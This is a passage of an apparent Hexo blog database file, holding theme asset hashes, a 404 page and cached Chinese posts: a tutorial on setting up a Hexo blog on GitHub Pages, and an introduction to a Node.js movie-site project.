ejs","hash":"f6b4c4eaafb5ac386273354b5f64a26139b7a3b0","modified":1482131436811},{"_id":"themes/yilia/layout/_partial/post/category.ejs","hash":"f75b236818b6c0ec0e5e6c12a517825d6230d756","modified":1490711252317},{"_id":"themes/yilia/layout/_partial/post/nav.ejs","hash":"b6a97043f9ec37e571aacacfedcda1d4d75e3c7c","modified":1482131436818},{"_id":"themes/yilia/layout/_partial/post/tag.ejs","hash":"2c4e4ca36c9bb4318506c38aca7127f1f44d827f","modified":1490711252342},{"_id":"themes/yilia/layout/_partial/post/share.ejs","hash":"06a2dd18ac9a43fbc9a59c61e6f795f9326e9927","modified":1482131436836},{"_id":"themes/yilia/layout/_partial/post/wangyiyun.ejs","hash":"fb022502c741b4a26bad6b2ad37245c10ede3f1a","modified":1496479320748},{"_id":"themes/yilia/layout/_partial/post/title.ejs","hash":"d4a460a35e2112d0c7414fd5e19b3a16093f1caf","modified":1482131436839},{"_id":"themes/yilia/layout/_partial/script.ejs","hash":"c71c3e704e844df3676f4a1b82d9cd8286f0b06b","modified":1499785209796},{"_id":"themes/yilia/source-src/css/core/_media-queries.scss","hash":"262ffcd88775080b7f511db37f58d2bcb1b2bfc7","modified":1482131436953},{"_id":"themes/yilia/source-src/css/core/_animation.scss","hash":"1834c3ed8560716e63bb3a50be94cac87fbbeaf3","modified":1482916678662},{"_id":"themes/yilia/source-src/css/core/_variables.scss","hash":"6e75bdaa46de83094ba0873099c6e7d656a22453","modified":1482131436981},{"_id":"themes/yilia/source-src/css/fonts/iconfont.svg","hash":"75767c904d483d9b93469afb6b92bb6bdface639","modified":1499785209929},{"_id":"themes/yilia/source-src/css/core/_reset.scss","hash":"398a49913b4a47d928103562b1ce94520be4026a","modified":1482131436979},{"_id":"themes/yilia/source-src/css/fonts/iconfont.eot","hash":"bc8c5e88f4994a852041b4d83f126d9c4d419b4a","modified":1499785209907},{"_id":"themes/yilia/source-src/css/fonts/iconfont.ttf","hash":"f342ac8bf4d937f42a7d6a0032ad267ab47eb7f2","modified":1499785209963},{"_id":"themes/yilia/source-src/css/fonts/iconfont.woff","hash":"aa9672cb097f7fd73ae5a03bcd3d9d726935bc0a","modified":1499785209998},{"_id":"themes/yilia/source-src/css/img/checkered-pattern.png","hash":"049262fa0886989d750637b264bed34ab51c23c8","modified":1482131437064},{"_id":"themes/yilia/source-src/css/img/tooltip.svg","hash":"397fe4b1093bf9b62457dac48aa15dac06b54a3c","modified":1482131437073},{"_id":"source/images/pasted-50.png","hash":"ecc7f84b907ca61644f2ff3c7a10e8b3ae5b37d1","modified":1489459060986},{"_id":"themes/yilia/source-src/css/img/scrollbar_arrow.png","hash":"d64a33c4ddfbdb89deeb6f4e3d36eb84dc4777c0","modified":1482131437066},{"_id":"themes/yilia/source-src/css/core/_mixin.scss","hash":"91db061c9c17628291a005e5bd4936cf9d35a6c4","modified":1482131436967},{"_id":"source/images/react_mobile.gif","hash":"6c173a701d8aafb412110b996106dfbf5de94fa1","modified":1496306198816},{"_id":"source/images/react_pc.gif","hash":"b85ae0fa86abc2d780436d299973d523cc52b710","modified":1496302736161},{"_id":"source/images/1488790170.gif","hash":"ac3f2304b3507100a106cbba21f94b1e34704b92","modified":1488790163536},{"_id":"source/images/2017-07-26-01-ios.gif","hash":"37628f913d0e02441db71b18400c73fc4a237778","modified":1501072177350},{"_id":"source/images/2017-07-26-01-android.gif","hash":"aed296f63159a6785e80a20563c33345e0a39660","modified":1501072769124}],"Category":[],"Data":[],"Page":[{"_content":"<html>\n<head>\n<meta charset=\"utf-8\">\n<title>404ҳ��</title>\n<script type=\"text/javascript\" src=\"http://www.qq.com/404/search_children.js\" charset=\"utf-8\" homePageUrl=\"http://yoursite.com/yourPage.html\" homePageName=\"�ص��ҵ���ҳ\"></script>\n</head>\n</html> ","source":"404.html","raw":"<html>\n<head>\n<meta charset=\"utf-8\">\n<title>404ҳ��</title>\n<script type=\"text/javascript\" src=\"http://www.qq.com/404/search_children.js\" charset=\"utf-8\" homePageUrl=\"http://yoursite.com/yourPage.html\" homePageName=\"�ص��ҵ���ҳ\"></script>\n</head>\n</html> ","date":"2019-05-10T03:31:38.733Z","updated":"2016-12-14T01:51:41.928Z","path":"404.html","title":"","comments":1,"layout":"page","_id":"cjvhjxa9q0000iny2vfn5lnmh","content":"<html>\n<head><meta name=\"generator\" content=\"Hexo 3.8.0\">\n<meta charset=\"utf-8\">\n<title>404ҳ��</title>\n<script type=\"text/javascript\" src=\"http://www.qq.com/404/search_children.js\" charset=\"utf-8\" homepageurl=\"http://yoursite.com/yourPage.html\" homepagename=\"�ص��ҵ���ҳ\"></script>\n</head>\n</html> ","site":{"data":{}},"excerpt":"","more":"<html>\n<head><meta name=\"generator\" content=\"Hexo 3.8.0\">\n<meta charset=\"utf-8\">\n<title>404ҳ��</title>\n<script type=\"text/javascript\" src=\"http://www.qq.com/404/search_children.js\" charset=\"utf-8\" homepageurl=\"http://yoursite.com/yourPage.html\" homepagename=\"�ص��ҵ���ҳ\"></script>\n</head>\n</html> "},{"title":"标签","date":"2016-12-14T02:05:06.000Z","type":"tags","comments":0,"_content":"","source":"tags/index.md","raw":"---\ntitle: 标签\ndate: 2016-12-14 10:05:06\ntype: \"tags\"\ncomments: false\n---","updated":"2016-12-14T02:11:41.381Z","path":"tags/index.html","layout":"page","_id":"cjvhjxaac0001iny2m0wk4mqe","content":"","site":{"data":{}},"excerpt":"","more":""}],"Post":[{"title":"hexo+github搭建免费个人博客","author":"Yooz","date":"2016-12-14T16:36:00.000Z","_content":"#### 前言\n        一直想着有时间就把自己会的分享出来，可是一直拖啊拖，这次决心要share出来。\n        \n#### 正文\n        Hexo 是一个简单地、轻量地、基于Node的一个静态博客框架，可以方便的生成静态网页托管在github和Heroku上，引用Hexo作者 @tommy351 的话：快速、简单且功能强大的 Node.js 博客框架。A fast, simple & powerful blog framework, powered by Node.js.\n\n\n#### 一,搭建平台\n###### 配置环境\n      * 安装Node（必须）\n      * 安装Git（必须）\n      * 申请github帐号（必须）\n \n       这三个就不用多说了。\n ###### 配置github\n         在github中创建仓库，仓库名必须和用户名对应 【your_user_name.github.io】，固定写法，如我们的github名叫zhangsan那么我们创建的仓库名是zhangsan.github.io。\n         创建完毕后进入新建的仓库页面。右侧有一个setting\n         ![pasted image](/images/pasted-0.png)","source":"_drafts/hexo-github搭建个人博客.md","raw":"title: hexo+github搭建免费个人博客\nauthor: Yooz\ntags: []\ncategories: []\ndate: 2016-12-15 00:36:00\n---\n#### 前言\n        一直想着有时间就把自己会的分享出来，可是一直拖啊拖，这次决心要share出来。\n        \n#### 正文\n        Hexo 是一个简单地、轻量地、基于Node的一个静态博客框架，可以方便的生成静态网页托管在github和Heroku上，引用Hexo作者 @tommy351 的话：快速、简单且功能强大的 Node.js 博客框架。A fast, simple & powerful blog framework, powered by Node.js.\n\n\n#### 一,搭建平台\n###### 配置环境\n      * 安装Node（必须）\n      * 安装Git（必须）\n      * 申请github帐号（必须）\n \n       这三个就不用多说了。\n ###### 配置github\n         在github中创建仓库，仓库名必须和用户名对应 【your_user_name.github.io】，固定写法，如我们的github名叫zhangsan那么我们创建的仓库名是zhangsan.github.io。\n         创建完毕后进入新建的仓库页面。右侧有一个setting\n         ![pasted image](/images/pasted-0.png)","slug":"hexo-github搭建个人博客","published":0,"updated":"2016-12-14T17:03:16.301Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjvhjxaad0002iny29s3ahk1f","content":"<h4 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h4><pre><code>一直想着有时间就把自己会的分享出来，可是一直拖啊拖，这次决心要share出来。\n</code></pre><h4 id=\"正文\"><a href=\"#正文\" class=\"headerlink\" title=\"正文\"></a>正文</h4><pre><code>Hexo 是一个简单地、轻量地、基于Node的一个静态博客框架，可以方便的生成静态网页托管在github和Heroku上，引用Hexo作者 @tommy351 的话：快速、简单且功能强大的 Node.js 博客框架。A fast, simple &amp; powerful blog framework, powered by Node.js.\n</code></pre><h4 id=\"一-搭建平台\"><a href=\"#一-搭建平台\" class=\"headerlink\" title=\"一,搭建平台\"></a>一,搭建平台</h4><h6 id=\"配置环境\"><a href=\"#配置环境\" class=\"headerlink\" title=\"配置环境\"></a>配置环境</h6><pre><code>* 安装Node（必须）\n* 安装Git（必须）\n* 申请github帐号（必须）\n\n 这三个就不用多说了。\n</code></pre><h6 id=\"配置github\"><a href=\"#配置github\" class=\"headerlink\" title=\"配置github\"></a>配置github</h6><pre><code>在github中创建仓库，仓库名必须和用户名对应 【your_user_name.github.io】，固定写法，如我们的github名叫zhangsan那么我们创建的仓库名是zhangsan.github.io。\n创建完毕后进入新建的仓库页面。右侧有一个setting\n![pasted image](/images/pasted-0.png)\n</code></pre>","site":{"data":{}},"excerpt":"","more":"<h4 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h4><pre><code>一直想着有时间就把自己会的分享出来，可是一直拖啊拖，这次决心要share出来。\n</code></pre><h4 id=\"正文\"><a href=\"#正文\" class=\"headerlink\" title=\"正文\"></a>正文</h4><pre><code>Hexo 是一个简单地、轻量地、基于Node的一个静态博客框架，可以方便的生成静态网页托管在github和Heroku上，引用Hexo作者 @tommy351 的话：快速、简单且功能强大的 Node.js 博客框架。A fast, simple &amp; powerful blog framework, powered by Node.js.\n</code></pre><h4 id=\"一-搭建平台\"><a href=\"#一-搭建平台\" class=\"headerlink\" title=\"一,搭建平台\"></a>一,搭建平台</h4><h6 id=\"配置环境\"><a href=\"#配置环境\" class=\"headerlink\" title=\"配置环境\"></a>配置环境</h6><pre><code>* 安装Node（必须）\n* 安装Git（必须）\n* 申请github帐号（必须）\n\n 这三个就不用多说了。\n</code></pre><h6 id=\"配置github\"><a href=\"#配置github\" class=\"headerlink\" title=\"配置github\"></a>配置github</h6><pre><code>在github中创建仓库，仓库名必须和用户名对应 【your_user_name.github.io】，固定写法，如我们的github名叫zhangsan那么我们创建的仓库名是zhangsan.github.io。\n创建完毕后进入新建的仓库页面。右侧有一个setting\n![pasted image](/images/pasted-0.png)\n</code></pre>"},{"layout":"post","title":"node开发电影站项目","date":"2016-12-20T08:45:59.000Z","comments":1,"_content":"\n## NodeJs + MongoDb + express4搭建电影站\n\n### 简介 \n>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;学习nodejs也有一段时间了，本项目是一个非常简单的前端后端结合的nodejs项目，代码非常简洁明了，适合初识nodejs的同学了解和学习。另外感谢Scott大哥提供的学习资料素材。\n\n### 数据库\n * MongoDb\n<!--more-->\n### web框架\n * express4\n\n### 前端\n * ejs\n\n### 构建\n * grunt\n\n### 前端\n>观看电影，查看电影详情，以及评论，还有分页搜索,登录退出等。\n\n### 后端\n> 对电影和分类进行添加和编辑以及删除，也可以添加删除用户,持久化session等。\n> 同时接入了豆瓣电影的api，只需把豆瓣电影里的电影序号粘贴到豆瓣同步中，即可自动添加电影。\n> 需要用户的role大于50也就是管理员权限才可以访问后台\n\n### 运行\n\t* npm install\n\t* mongod --dbpath D:\\db \n\t* grunt\n\t\n\n### 首页\n\n![首页](https://raw.githubusercontent.com/Y00z/nodejs_movie/master/public/upload/_index.png)\n\n\n### 添加电影\n\n![添加电影](https://raw.githubusercontent.com/Y00z/nodejs_movie/master/public/upload/_add.png)\n\n### 电影列表\n\n![电影列表](https://raw.githubusercontent.com/Y00z/nodejs_movie/master/public/upload/_list.png)\n\n### 分页\n\n![分页](https://raw.githubusercontent.com/Y00z/nodejs_movie/master/public/upload/_page.png)\n\n### 搜索\n\n![搜索](https://raw.githubusercontent.com/Y00z/nodejs_movie/master/public/upload/_search.png)\n\n### 项目地址\n * [https://github.com/Y00z/nodejs_movie](https://github.com/Y00z/nodejs_movie)","source":"_posts/diary-2016-1220-01.md","raw":"---\nlayout: post\ntitle: node开发电影站项目\ndate: 2016-12-20 16:45:59\ncomments: true\ntags:\n\t- 开源\n\t- NodeJs\n---\n\n## NodeJs + MongoDb + express4搭建电影站\n\n### 简介 \n>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;学习nodejs也有一段时间了，本项目是一个非常简单的前端后端结合的nodejs项目，代码非常简洁明了，适合初识nodejs的同学了解和学习。另外感谢Scott大哥提供的学习资料素材。\n\n### 数据库\n * MongoDb\n<!--more-->\n### web框架\n * express4\n\n### 前端\n * ejs\n\n### 构建\n * grunt\n\n### 前端\n>观看电影，查看电影详情，以及评论，还有分页搜索,登录退出等。\n\n### 后端\n> 对电影和分类进行添加和编辑以及删除，也可以添加删除用户,持久化session等。\n> 同时接入了豆瓣电影的api，只需把豆瓣电影里的电影序号粘贴到豆瓣同步中，即可自动添加电影。\n> 需要用户的role大于50也就是管理员权限才可以访问后台\n\n### 运行\n\t* npm install\n\t* mongod --dbpath D:\\db \n\t* grunt\n\t\n\n### 首页\n\n![首页](https://raw.githubusercontent.com/Y00z/nodejs_movie/master/public/upload/_index.png)\n\n\n### 添加电影\n\n![添加电影](https://raw.githubusercontent.com/Y00z/nodejs_movie/master/public/upload/_add.png)\n\n### 电影列表\n\n![电影列表](https://raw.githubusercontent.com/Y00z/nodejs_movie/master/public/upload/_list.png)\n\n### 分页\n\n![分页](https://raw.githubusercontent.com/Y00z/nodejs_movie/master/public/upload/_page.png)\n\n### 搜索\n\n![搜索](https://raw.githubusercontent.com/Y00z/nodejs_movie/master/public/upload/_search.png)\n\n### 项目地址\n * [https://github.com/Y00z/nodejs_movie](https://github.com/Y00z/nodejs_movie)","slug":"diary-2016-1220-01","published":1,"updated":"2017-07-26T05:19:38.607Z","photos":[],"link":"","_id":"cjvhjxaah0003iny2pbaq9y76","content":"<h2 id=\"NodeJs-MongoDb-express4搭建电影站\"><a href=\"#NodeJs-MongoDb-express4搭建电影站\" class=\"headerlink\" title=\"NodeJs + MongoDb + express4搭建电影站\"></a>NodeJs + MongoDb + express4搭建电影站</h2><h3 id=\"简介\"><a href=\"#简介\" class=\"headerlink\" title=\"简介\"></a>简介</h3><blockquote>\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;学习nodejs也有一段时间了，本项目是一个非常简单的前端后端结合的nodejs项目，代码非常简洁明了，适合初识nodejs的同学了解和学习。另外感谢Scott大哥提供的学习资料素材。</p>\n</blockquote>\n<h3 id=\"数据库\"><a href=\"#数据库\" class=\"headerlink\" title=\"数据库\"></a>数据库</h3><ul>\n<li>MongoDb<a id=\"more\"></a>\n<h3 id=\"web框架\"><a href=\"#web框架\" class=\"headerlink\" title=\"web框架\"></a>web框架</h3></li>\n<li>express4</li>\n</ul>\n<h3 id=\"前端\"><a href=\"#前端\" class=\"headerlink\" title=\"前端\"></a>前端</h3><ul>\n<li>ejs</li>\n</ul>\n<h3 id=\"构建\"><a href=\"#构建\" class=\"headerlink\" title=\"构建\"></a>构建</h3><ul>\n<li>grunt</li>\n</ul>\n<h3 id=\"前端-1\"><a href=\"#前端-1\" class=\"headerlink\" title=\"前端\"></a>前端</h3><blockquote>\n<p>观看电影，查看电影详情，以及评论，还有分页搜索,登录退出等。</p>\n</blockquote>\n<h3 id=\"后端\"><a href=\"#后端\" class=\"headerlink\" title=\"后端\"></a>后端</h3><blockquote>\n<p>对电影和分类进行添加和编辑以及删除，也可以添加删除用户,持久化session等。<br>同时接入了豆瓣电影的api，只需把豆瓣电影里的电影序号粘贴到豆瓣同步中，即可自动添加电影。<br>需要用户的role大于50也就是管理员权限才可以访问后台</p>\n</blockquote>\n<h3 id=\"运行\"><a href=\"#运行\" class=\"headerlink\" title=\"运行\"></a>运行</h3><pre><code>* npm install\n* mongod --dbpath D:\\db \n* grunt\n</code></pre><h3 id=\"首页\"><a href=\"#首页\" class=\"headerlink\" title=\"首页\"></a>首页</h3><p><img src=\"https://raw.githubusercontent.com/Y00z/nodejs_movie/master/public/upload/_index.png\" alt=\"首页\"></p>\n<h3 id=\"添加电影\"><a href=\"#添加电影\" class=\"headerlink\" title=\"添加电影\"></a>添加电影</h3><p><img src=\"https://raw.githubusercontent.com/Y00z/nodejs_movie/master/public/upload/_add.png\" alt=\"添加电影\"></p>\n<h3 id=\"电影列表\"><a href=\"#电影列表\" class=\"headerlink\" title=\"电影列表\"></a>电影列表</h3><p><img src=\"https://raw.githubusercontent.com/Y00z/nodejs_movie/master/public/upload/_list.png\" alt=\"电影列表\"></p>\n<h3 id=\"分页\"><a href=\"#分页\" class=\"headerlink\" title=\"分页\"></a>分页</h3><p><img src=\"https://raw.githubusercontent.com/Y00z/nodejs_movie/master/public/upload/_page.png\" alt=\"分页\"></p>\n<h3 id=\"搜索\"><a href=\"#搜索\" class=\"headerlink\" title=\"搜索\"></a>搜索</h3><p><img src=\"https://raw.githubusercontent.com/Y00z/nodejs_movie/master/public/upload/_search.png\" alt=\"搜索\"></p>\n<h3 id=\"项目地址\"><a href=\"#项目地址\" class=\"headerlink\" title=\"项目地址\"></a>项目地址</h3><ul>\n<li><a href=\"https://github.com/Y00z/nodejs_movie\" target=\"_blank\" rel=\"noopener\">https://github.com/Y00z/nodejs_movie</a></li>\n</ul>\n","site":{"data":{}},"excerpt":"<h2 id=\"NodeJs-MongoDb-express4搭建电影站\"><a href=\"#NodeJs-MongoDb-express4搭建电影站\" class=\"headerlink\" title=\"NodeJs + MongoDb + express4搭建电影站\"></a>NodeJs + MongoDb + express4搭建电影站</h2><h3 id=\"简介\"><a href=\"#简介\" class=\"headerlink\" title=\"简介\"></a>简介</h3><blockquote>\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;学习nodejs也有一段时间了，本项目是一个非常简单的前端后端结合的nodejs项目，代码非常简洁明了，适合初识nodejs的同学了解和学习。另外感谢Scott大哥提供的学习资料素材。</p>\n</blockquote>\n<h3 id=\"数据库\"><a href=\"#数据库\" class=\"headerlink\" title=\"数据库\"></a>数据库</h3><ul>\n<li>MongoDb","more":"<h3 id=\"web框架\"><a href=\"#web框架\" class=\"headerlink\" title=\"web框架\"></a>web框架</h3></li>\n<li>express4</li>\n</ul>\n<h3 id=\"前端\"><a href=\"#前端\" class=\"headerlink\" title=\"前端\"></a>前端</h3><ul>\n<li>ejs</li>\n</ul>\n<h3 id=\"构建\"><a href=\"#构建\" class=\"headerlink\" title=\"构建\"></a>构建</h3><ul>\n<li>grunt</li>\n</ul>\n<h3 id=\"前端-1\"><a href=\"#前端-1\" class=\"headerlink\" title=\"前端\"></a>前端</h3><blockquote>\n<p>观看电影，查看电影详情，以及评论，还有分页搜索,登录退出等。</p>\n</blockquote>\n<h3 id=\"后端\"><a href=\"#后端\" class=\"headerlink\" title=\"后端\"></a>后端</h3><blockquote>\n<p>对电影和分类进行添加和编辑以及删除，也可以添加删除用户,持久化session等。<br>同时接入了豆瓣电影的api，只需把豆瓣电影里的电影序号粘贴到豆瓣同步中，即可自动添加电影。<br>需要用户的role大于50也就是管理员权限才可以访问后台</p>\n</blockquote>\n<h3 id=\"运行\"><a href=\"#运行\" class=\"headerlink\" title=\"运行\"></a>运行</h3><pre><code>* npm install\n* mongod --dbpath D:\\db \n* grunt\n</code></pre><h3 id=\"首页\"><a href=\"#首页\" class=\"headerlink\" title=\"首页\"></a>首页</h3><p><img src=\"https://raw.githubusercontent.com/Y00z/nodejs_movie/master/public/upload/_index.png\" alt=\"首页\"></p>\n<h3 id=\"添加电影\"><a href=\"#添加电影\" class=\"headerlink\" title=\"添加电影\"></a>添加电影</h3><p><img src=\"https://raw.githubusercontent.com/Y00z/nodejs_movie/master/public/upload/_add.png\" alt=\"添加电影\"></p>\n<h3 id=\"电影列表\"><a href=\"#电影列表\" class=\"headerlink\" title=\"电影列表\"></a>电影列表</h3><p><img src=\"https://raw.githubusercontent.com/Y00z/nodejs_movie/master/public/upload/_list.png\" alt=\"电影列表\"></p>\n<h3 id=\"分页\"><a href=\"#分页\" class=\"headerlink\" title=\"分页\"></a>分页</h3><p><img src=\"https://raw.githubusercontent.com/Y00z/nodejs_movie/master/public/upload/_page.png\" alt=\"分页\"></p>\n<h3 id=\"搜索\"><a href=\"#搜索\" class=\"headerlink\" title=\"搜索\"></a>搜索</h3><p><img src=\"https://raw.githubusercontent.com/Y00z/nodejs_movie/master/public/upload/_search.png\" alt=\"搜索\"></p>\n<h3 id=\"项目地址\"><a href=\"#项目地址\" class=\"headerlink\" title=\"项目地址\"></a>项目地址</h3><ul>\n<li><a href=\"https://github.com/Y00z/nodejs_movie\" target=\"_blank\" rel=\"noopener\">https://github.com/Y00z/nodejs_movie</a></li>\n</ul>"},{"layout":"post","title":"hexo+github搭建免费个人博客","date":"2016-12-14T17:06:22.000Z","comments":1,"_content":"## 前言\n>一直想着有时间就把自己会的技术分享出来，可是一直拖啊拖，这次搭建了个博客，决心要share出来。\n       \n## 正文\n >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Hexo 是一个简单地、轻量地、基于Node的一个静态博客框架，可以方便的生成静态网页托 管在github和Heroku上，引用Hexo作者 @tommy351 的话：快速、简单且功能强大的 Node.js 博客框架。A fast, simple & powerful blog framework, powered by Node.js.\n <!--more-->\n\n# 一,搭建平台\n###### 配置环境\n> * 安装Node（必须）\n> * 安装Git（必须）\n> * 申请github帐号（必须）\n\n这三个就不用多说了。\n###### 配置github\n  >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在github中创建仓库，仓库名必须和用户名对应 【your_user_name.github.io】，固定写法，如我们的github名叫zhangsan那么我们创建的仓库名是zhangsan.github.io。创建完毕后进入新建的仓库页面。右侧有一个setting\n\n>![](http://oi6ni1o6u.bkt.clouddn.com/pasted-0.png)\n\n>往下拉有个launch automatic page generator\n\n>![\"img\"](http://oi6ni1o6u.bkt.clouddn.com/pasted-1.png)\n\n>输入标题和内容\n\n>![\"img\"](http://oi6ni1o6u.bkt.clouddn.com/pasted-2.png)\n\n>完成后选择样式主题\n\n>![\"img\"](http://oi6ni1o6u.bkt.clouddn.com/pasted-3.png)\n\n>选择完毕就可以点publish page我们的博客就已经完成了最后来查看效果\n>`https://zhangsan.github.io/`\n# 二,hexo生成博客\n###### 安装hexo\n    * npm install -g hexo\n\t* npm install hexo-deployer-git --save\n>安装成功后输入命令 `hexo init blogname` ， 来初始化一个hexo博客,同时会新建blogname的文件夹，里面存放的就是我们博客的所有文件了\n\n###### 设置主题\n   >主题: `https://hexo.io/themes/`\n   找到我们需要的主题对应的github仓库，我们 cd blogname 切换到博客文件夹中\n    * git clone https://github.com/iissnan/hexo-theme-next.git themes/next\n>把hexo主题克隆到博客文件夹中。\n>然后再打开博客主页中的`_config.yml`，找到`theme`,后面加上我们主题的名字如theme: next\n>最后运行`hexo s`可以来查看效果了\n>浏览器输入 `http://localhost:4000`\n>查看效果。\n\n# 三,同步github\n###### 设置ssh key\n>首先进入到`C:\\Users\\username\\.ssh`文件夹中，把里面文件都删掉\n>然后输入命令输入`bash`(配置git环境才有),进入bash shell\n>再来依次输入命令生成ssh\n\t* ssh-keygen -t rsa -C your_github_email@163.com(提示输入密码不用理,直接回车)\n\t* ssh-agent –s\n\t* ssh-add ~/.ssh/id_rsa\n\t* eval `ssh-agent -s\n\t* ssh-add\n>如果输出了ssh目录呢,就说明生成成功了\n\n>![\"img\"](http://oi6ni1o6u.bkt.clouddn.com/pasted-4.png)\n\n>进入`C:\\Users\\username\\.ssh`目录,`id_rsa.pub`文件就是我们的key。\n\n###### github设置ssh key\n>打开github的setting\n>![\"img\"](http://oi6ni1o6u.bkt.clouddn.com/pasted-5.png)\n>下面有一个SSH and GPG keys\n>![\"img\"](http://oi6ni1o6u.bkt.clouddn.com/pasted-6.png)\n>然后New ssh key，就可以输入标题和key了\n>标题随意，key就是`C:\\Users\\username\\.ssh\\id_rsa.pub`中的内容，全部复制粘贴过去。\n>![\"img\"](http://oi6ni1o6u.bkt.clouddn.com/pasted-7.png)\n>Add SSH key 就ok了\n\n###### 测试\n>在bash shell中输入`ssh git@github.com`\n><font color=\"#ff0000\">注意：\n>提示yes or no的话，一定要输入yes，千万别直接回车。</font>\n>如果回馈了我们github的用户名就说明连接成功了，可以直接部署到github上面了\n>![\"img\"](http://oi6ni1o6u.bkt.clouddn.com/pasted-8.png)\n\n###### hexo同步到github\n>打开blog文件夹中的`_config.yml`,在最后一行加上\n\t* deploy: \n    * type: git\n    * repository: https://github.com/Y00z/y00z.github.io.git\n    * branch: master\n>repository中的地址是上面创建的仓库的地址\n>![\"img\"](http://oi6ni1o6u.bkt.clouddn.com/pasted-9.png)\n><font color=\"#ff0000\">注意:\n>type: 和repository: 以及branch: \n>冒号后面有一个空格。</font>\n>最后hexo就可以同步到github上了\n>每次同步到github的命令行\n>   * hexo clean && hexo g && hexo d\n>最后户可以进入your_github_name.github.io 查看效果了。\n\n# 其他\n###### 更新\n\n  * 更新hexo：\n\t  *   npm update -g hexo\n  * 更新主题：\n\t  *   cd themes/你的主题\n\t  *   git pull\n  * 更新插件：\n\t  *   npm update\n\n###### hexo命令\n\n\n* hexo new \"postName\"       #新建文章\n* hexo new page \"pageName\"  #新建页面\n* hexo generate             #生成静态页面至public目录\n* hexo server               #开启预览访问端口\n* hexo deploy               #将.deploy目录部署到GitHub\n* hexo clean\t\t\t\t#清除缓存\n\n\n","source":"_posts/diary-2016-1215-01.md","raw":"---\nlayout: post\ntitle: hexo+github搭建免费个人博客\ndate: 2016-12-15 01:06:22\ncomments: true\ntags: \n\t- hexo\n---\n## 前言\n>一直想着有时间就把自己会的技术分享出来，可是一直拖啊拖，这次搭建了个博客，决心要share出来。\n       \n## 正文\n >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Hexo 是一个简单地、轻量地、基于Node的一个静态博客框架，可以方便的生成静态网页托 管在github和Heroku上，引用Hexo作者 @tommy351 的话：快速、简单且功能强大的 Node.js 博客框架。A fast, simple & powerful blog framework, powered by Node.js.\n <!--more-->\n\n# 一,搭建平台\n###### 配置环境\n> * 安装Node（必须）\n> * 安装Git（必须）\n> * 申请github帐号（必须）\n\n这三个就不用多说了。\n###### 配置github\n  >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在github中创建仓库，仓库名必须和用户名对应 【your_user_name.github.io】，固定写法，如我们的github名叫zhangsan那么我们创建的仓库名是zhangsan.github.io。创建完毕后进入新建的仓库页面。右侧有一个setting\n\n>![](http://oi6ni1o6u.bkt.clouddn.com/pasted-0.png)\n\n>往下拉有个launch automatic page generator\n\n>![\"img\"](http://oi6ni1o6u.bkt.clouddn.com/pasted-1.png)\n\n>输入标题和内容\n\n>![\"img\"](http://oi6ni1o6u.bkt.clouddn.com/pasted-2.png)\n\n>完成后选择样式主题\n\n>![\"img\"](http://oi6ni1o6u.bkt.clouddn.com/pasted-3.png)\n\n>选择完毕就可以点publish page我们的博客就已经完成了最后来查看效果\n>`https://zhangsan.github.io/`\n# 二,hexo生成博客\n###### 安装hexo\n    * npm install -g hexo\n\t* npm install hexo-deployer-git --save\n>安装成功后输入命令 `hexo init blogname` ， 来初始化一个hexo博客,同时会新建blogname的文件夹，里面存放的就是我们博客的所有文件了\n\n###### 设置主题\n   >主题: `https://hexo.io/themes/`\n   找到我们需要的主题对应的github仓库，我们 cd blogname 切换到博客文件夹中\n    * git clone https://github.com/iissnan/hexo-theme-next.git themes/next\n>把hexo主题克隆到博客文件夹中。\n>然后再打开博客主页中的`_config.yml`，找到`theme`,后面加上我们主题的名字如theme: next\n>最后运行`hexo s`可以来查看效果了\n>浏览器输入 `http://localhost:4000`\n>查看效果。\n\n# 三,同步github\n###### 设置ssh key\n>首先进入到`C:\\Users\\username\\.ssh`文件夹中，把里面文件都删掉\n>然后输入命令输入`bash`(配置git环境才有),进入bash shell\n>再来依次输入命令生成ssh\n\t* ssh-keygen -t rsa -C your_github_email@163.com(提示输入密码不用理,直接回车)\n\t* ssh-agent –s\n\t* ssh-add ~/.ssh/id_rsa\n\t* eval `ssh-agent -s\n\t* ssh-add\n>如果输出了ssh目录呢,就说明生成成功了\n\n>![\"img\"](http://oi6ni1o6u.bkt.clouddn.com/pasted-4.png)\n\n>进入`C:\\Users\\username\\.ssh`目录,`id_rsa.pub`文件就是我们的key。\n\n###### github设置ssh key\n>打开github的setting\n>![\"img\"](http://oi6ni1o6u.bkt.clouddn.com/pasted-5.png)\n>下面有一个SSH and GPG keys\n>![\"img\"](http://oi6ni1o6u.bkt.clouddn.com/pasted-6.png)\n>然后New ssh key，就可以输入标题和key了\n>标题随意，key就是`C:\\Users\\username\\.ssh\\id_rsa.pub`中的内容，全部复制粘贴过去。\n>![\"img\"](http://oi6ni1o6u.bkt.clouddn.com/pasted-7.png)\n>Add SSH key 就ok了\n\n###### 测试\n>在bash shell中输入`ssh git@github.com`\n><font color=\"#ff0000\">注意：\n>提示yes or no的话，一定要输入yes，千万别直接回车。</font>\n>如果回馈了我们github的用户名就说明连接成功了，可以直接部署到github上面了\n>![\"img\"](http://oi6ni1o6u.bkt.clouddn.com/pasted-8.png)\n\n###### hexo同步到github\n>打开blog文件夹中的`_config.yml`,在最后一行加上\n\t* deploy: \n    * type: git\n    * repository: https://github.com/Y00z/y00z.github.io.git\n    * branch: master\n>repository中的地址是上面创建的仓库的地址\n>![\"img\"](http://oi6ni1o6u.bkt.clouddn.com/pasted-9.png)\n><font color=\"#ff0000\">注意:\n>type: 和repository: 以及branch: \n>冒号后面有一个空格。</font>\n>最后hexo就可以同步到github上了\n>每次同步到github的命令行\n>   * hexo clean && hexo g && hexo d\n>最后户可以进入your_github_name.github.io 查看效果了。\n\n# 其他\n###### 更新\n\n  * 更新hexo：\n\t  *   npm update -g hexo\n  * 更新主题：\n\t  *   cd 